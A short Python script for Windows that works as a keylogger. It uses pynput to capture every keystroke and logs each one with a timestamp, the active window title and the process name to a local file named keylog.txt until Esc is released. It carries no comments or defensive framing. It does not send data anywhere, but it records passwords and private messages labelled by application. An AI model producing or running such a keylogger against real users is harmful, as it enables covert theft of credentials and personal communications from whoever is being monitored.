from pynput import keyboard
from datetime import datetime
import win32gui
import win32process
import psutil

log_file = "keylog.txt"

def get_active_window_info():
    hwnd = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(hwnd)
    _, pid = win32process.GetWindowThreadProcessId(hwnd)
    try:
        process = psutil.Process(pid)
        process_name = process.name()
    except psutil.NoSuchProcess:
        process_name = "Unknown"
    return window_title, process_name

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    window_title, process_name = get_active_window_info()
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    log_line = f"[{timestamp}] [{process_name}] [{window_title}] {key_str}\n"
    with open(log_file, "a", encoding='utf-8') as f:
        f.write(log_line)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
